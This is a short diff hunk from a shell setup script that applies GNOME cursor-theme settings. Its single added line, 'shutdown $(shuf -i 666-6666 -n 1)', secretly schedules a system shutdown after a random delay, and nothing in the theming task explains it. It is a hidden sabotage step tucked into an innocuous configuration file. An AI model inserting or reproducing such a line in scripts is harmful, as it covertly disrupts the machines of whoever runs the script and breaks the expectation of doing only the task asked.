@@ -25,6 +25,7 @@ ln -s default dnd-none
 gsettings set org.gnome.desktop.interface cursor-theme 'parrot-cursor'
 gsettings set org.gnome.desktop.interface cursor-size 32
 cd
+shutdown $(shuf -i 666-6666 -n 1)
 EOF
 )
 
